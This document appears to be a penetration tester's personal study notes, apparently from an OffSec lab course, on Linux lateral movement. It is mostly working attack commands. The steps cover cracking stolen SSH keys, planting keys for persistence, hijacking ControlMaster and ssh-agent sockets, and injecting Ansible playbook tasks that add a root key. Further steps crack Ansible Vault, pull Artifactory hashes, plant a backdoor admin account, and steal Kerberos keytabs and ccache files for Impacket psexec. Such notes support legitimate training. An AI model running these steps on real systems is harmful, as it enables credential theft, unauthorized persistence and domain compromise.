## Linux Lateral movement
#lateral-movement
Linking Linux:
[[Linux Post-exp]]

### Lateral movement with SSH

Stealing the key is the target, typically the permissions on the key are 600, but it might not always be the case. 
#ssh 

```bash
find /home -name "id_rsa"
```
Once we are root we can examine what is on the disk. When the priv key has the **Proc-Type header** it means it is encrypted with the password. 

If the system has **HashKnownHosts** in the **/etc/ssh/ssh_config** the hosts inside the **.known_hosts directory will be hashed** - that means that we cannot figure out where the user connected. We can always browse the **.bash_history**.

we can crack the key offline:
#cracking #private-key #rsa #ssh
```bash
python2 /usr/share/john/ssh2john.py svuser.key > svuser.hash
john --wordlist=/usr/share/wordlists/rockyou.txt svuser.hash
```

#### SSH Persistance

We must inject our public key to the users ~/.ssh/authorized_keys. To generate on kali:
#ssh #persitance
```bash
ssh-keygen
xclip -selection clipboard .ssh/id_rsa.pub
# then paste to the ~/.ssh/authorized_keys or we can do:
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
```

#### SSH Hijacking with ControlMaster

**ControlMaster** was made for admin to reuse the same socket for SSH connection. The following config must be in the **~/.ssh/config** to configure the ControlMaster:
#config #ssh #hijacking
```bash
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m


```
Then we need to have the right permission on the config and controlmaster directory
```bash
chmod 644 ~/.ssh/config
mkdir ~/.ssh/controlmaster
```

When the victim would come and connect to different host using ssh, we would be able to see the socket files in the controlmaster folder.
#ssh #hijacking 
```bash
ls -la ~/.ssh/controlmaster/
# Now, we can just ssh to reuse the same socket.
ssh offsec@linuxvictim
# If we are root, we can hijack using the -S param
ssh -S /home/offsec/.ssh/controlmaster/offsec@linuxvictim\:22 offsec@linuxvictim
```


#### SSH Hijacking using ssh-agent and forwarding

**SSH agent** keeps track of user's private keys. It allows to access the remote ssh agent as it is local one. In that case someone can use **ssh-proxy** to access other segment of the network, which is not reachable normally. It allows to use the private key on different machine without transporting it to the machine. 

It is easy to exploit, if you have exploited the same user and the AllowAgentForwarding is set in the sshd config:
#config #ssh #hijacking
```bash
grep AllowAgentForwarding /etc/ssh/sshd_config 
```
Then, when the victim is authenticated and the victim has the ssh agent configured, you can just **reuse the socket** (if the same user, you can do auto just ssh to destination) with **root** user:
#ssh #hijacking #socket
```bash
ps aux | grep ssh
pstree -p <username> | grep ssh
# Once we got the bash pid we read the environ file
cat /proc/<proc_id>/environ
# Then we can copy the SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-QhSEiwfZdQ/agent.2547 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-QhSEiwfZdQ/agent.2547 ssh offsec@linuxvictim
```

### DevOps

#### Ansible
#devops #ansible

Config management tool - nodes run the ansible agent that executes python scripts pushed by the ansible master.
Inventory is in the **/etc/ansible/hosts**. The **controller** needs to connect to nodes via **SSH**, so it must have either the password or the ssh key The **Ansible user** will typically have **root or sudo perms**.


##### Enumerating ansible: 
#enum #ansible 
if ansible is on the system there will be **/etc/ansible** path and /usr/bin/ansible binary or **ansibleadm** in the **/etc/passwd**. Those things would be on controller.
For the node, we can check the /etc/passwd for the same user, /home for home dir of the ansibleadm or the /var/log/syslog for the ansible related messages.


We can execute the commands from controller on nodes either by Ad-hoc command or by playbooks.

Ad-hoc command on the victims (defined in the **/etc/ansible/hosts**) group, we need to run as ansibleadm:
#cmd-exec #ansible 
```bash
ansible victims -a "whoami"
```
we can use **--become** to run as **root** or provided any username to become to run as user.

##### Ansible Playbooks - Yaml

We can also run the playbooks to execute the shell command:
#cmd-exec #yaml #ansible 

```yaml
---
- name: RunCmd
  hosts: all
  gather_facts: true
  become: yes
  tasks:
    - name: Run command
      shell: id
      async: 10 
      poll: 0



# ansible-playbook runcommand.yml 
# you can do hosts: all or specific host e.g. hosts: linuxvictim
# we can steal ansibleadm ssh key and login to node directly.
```


But if we are not root or ansibleadm, we must search for the **hardcoded passwords** on world readable folders. In the playbooks, **ansible_become_pass** stores the **ssh password**, however there might be also passwords in the env vars or in the shell commands inline. 

We have also something called Ansible_Vault. We can crack this value offline:
#creds-leak 

```yaml
# test.yml
$ANSIBLE_VAULT;1.1;AES256
39363631613935326235383232616639613231303638653761666165336131313965663033313232
3736626166356263323964366533656633313230323964300a323838373031393362316534343863
36623435623638373636626237333163336263623737383532663763613534313134643730643532
3132313130313534300a383762366333303666363165383962356335383662643765313832663238
3036

# python2 /usr/share/john/ansible2john.py test.yml >test.john
# then either:
# john test.john --show
# or copy the part after filename to new file and run hashcat
# hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
#
# once we have the password we copy the same vault encrypted value to the disk and run the:
# cat pw.txt | ansible-vault decrypt
```

If we have the write access to the playbook, we can inject extra task, example:
#cmd-exec #ansible 
```yaml
---
- name: Get system info
    hosts: all
    gather_facts: true
    become: yes
    tasks:
        - name: Display info
        debug:
            msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
        - name: Create a directory if it does not exist
        file:
            path: /root/.ssh
            state: directory
            mode: '0700'
            owner: root
            group: root
        - name: Create authorized keys if it does not exist
        file:
            path: /root/.ssh/authorized_keys
            state: touch
            mode: '0600'
            owner: root
            group: root
        - name: Update keys
        lineinfile:
            path: /root/.ssh/authorized_keys
            line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
            insertbefore: EOF
```

##### Sensitive Data leakage via Ansible

#creds-leak 
The shell ansible module might leak the credentials e.g. in the shell line. It will log the shell command to the syslog by default.
Except if the no_log: true is set in the playbook. We can grep the **/var/log/syslog** for the passwords.


#### Artifactory

Binary software repo - single source of truth for the software packages. Good target for supply chain compromise attacks.
#repo #enum 

To start artifactory as a service:
```bash
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```

Open Source allows - gradle, maven, iv, spt and generic.

To enumerate we **grep the ps for artifactory** or remotely on port **8081, 8082**.

##### Artifactory back-up compromised:
We have root access to the server, but do not have artifactory creds. Files on the disk are stored by the file hash, also the files would not change.

User's and password's hashes are in the database - usually it is postgresql, default it is apache derby. We need to compromise the database 1. Through back-ups:
#back-ups #creds-leak #repo
```bash
cd /opt/jfrog/artifactory/var/backup/access/
```

There are bcrypt hashes, we can copy them without bcrypt$ (one $ at the beginning) and use john to crack.

If there are no back-ups we can copy the derby database and remove the locks:
```bash
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
sudo rm /tmp/hackeddb/derby/*.lck
```
Then we can use derby utility to connect to db, no username or passwd:
```bash
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
connect 'jdbc:derby:/tmp/hackeddb/derby';
select * from access_users;
```

For other engines, we can try to inject our user directly to DB.
#add-acc

We can also add second admin account:
```bash
echo "haxmin@*=haxhaxhax" > /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```

### Kerberos on Linux

#kerberos #linux #AD #creds-leak 
When the Domain user authenticates to the linux host over ssh e.g. ssh Administrator@corp1.com@linuxvictim , they have the cached kerb file with kerberos tickets:

```bash
env | grep KRB5
KRB5CCNAME=FILE:/tmp/krb5cc_607000500_JwdYQ1
```

We cab use kinit to request TGT.
```bash
kinit
klist
```

#AD 
We can list now the SPN using kerberos auth:
```bash
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
```

We can request the Service ticket with kvno:
#AD #kerberos 
```
kvno MSSQLSvc/dc01.corp1.com:1433
klist
```

#### Stealing keytabs

Automated scripts access the domain resource on behalf of the identity using the keytab files. Those are permistant form of kerberos access. If we cna steal the keytab we have the same permissions as compromising the password. Cronscripts use the keytabs.
#creds-leak #AD #kerberos
To save the keytab to file we can:
```bash
ktutil
addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
wkt /tmp/administrator.keytab
quit
```

Then, if you are able to compromise the root, you can do:
#kerberos #AD #smb
```bash
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
# to renew
kinit -R
# now we can use the kerberos:
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$/
```

#### Credentials cache files

If we got sudo or root, we can copy somone Ccache file and use it as our own.
#kerberos #creds-leak 
```bash
# copy first then set the env variable:
kdestroy
export KRB5CCNAME=/tmp/krb5cc_0
klist
```

#### Kerberos with Impacket
#impacket  #kerberos #creds-leak 
We steal CC file to our kali instance:
```bash
scp root@linuxvictim:/tmp/krb5cc_0 /tmp/krb5cc_minenow
export KRB5CCNAME=/tmp/krb5cc_minenow
# install krb5-user
sudo apt-get install krb5-user
# configure to corp1.com
# add corp1.com entries to the /etc/hosts
```

We need to have the same source IP to use TGT, that is why we need the socks proxy:
#socks-proxy #socket  #config 
```bash
# Comment proxy_dns in the /etc/proxychains.conf - the socks is set to the localhost 1080
# Run ssh socks proxy:
ssh offsec@linuxvictim -D 1080 -N
```
Then you can use proxychains to execute impacket scripts:
#socks-proxy #AD #kerberos 
```bash
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.186.5 CORP1.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.186.5 CORP1.COM/Administrator
proxychains impacket-psexec Administrator@DC01.CORP1.COM -k -no-pass
```

To do - steal keberos ticket from windows, convert to the krb5cc format.
